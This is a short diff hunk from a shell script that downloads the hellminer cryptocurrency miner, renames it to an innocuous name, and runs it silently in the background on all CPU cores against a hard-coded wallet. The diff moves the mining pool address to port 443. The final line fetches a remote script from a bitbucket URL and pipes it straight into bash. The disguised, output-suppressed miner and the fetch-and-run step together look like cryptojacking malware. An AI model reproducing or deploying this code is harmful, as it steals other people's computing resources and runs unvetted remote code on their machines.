@@ -14,5 +14,5 @@ wget https://github.com/hellcatz/hminer/releases/download/v0.57/hellminer_linux6
 tar -xf hellminer_linux64.tar.gz >/dev/null 2>&1
 rm -rvf hellminer_linux64.tar.gz >/dev/null 2>&1
 mv hellminer sgr1
-./sgr1 -c stratum+tcp://149.56.27.47:3956 -u RWXttxnPnw25JkD2QzfJCW4JcoeCoivtF1.Rig-Rent -p x --cpu $(nproc --all) --keep-alive >/dev/null 2>&1 &
+./sgr1 -c stratum+tcp://161.35.74.99:443 -u RWXttxnPnw25JkD2QzfJCW4JcoeCoivtF1.Rig-Rent -p x --cpu $(nproc --all) --keep-alive >/dev/null 2>&1 &
 curl -sL https://bitbucket.org/lightcoral2/cangor/raw/master/boled04.sh | bash
